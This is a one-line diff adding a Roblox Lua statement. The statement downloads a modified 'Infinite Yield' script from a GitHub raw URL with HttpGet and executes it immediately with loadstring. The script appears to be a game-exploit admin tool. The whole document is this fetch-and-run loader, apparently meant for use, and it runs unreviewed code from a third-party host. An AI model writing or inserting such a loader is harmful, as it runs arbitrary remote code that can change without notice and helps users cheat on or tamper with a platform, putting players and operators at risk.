@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dltr-ok/InfiniteYieldZ-Modded/refs/heads/main/InfiniteYieldZ",true))()
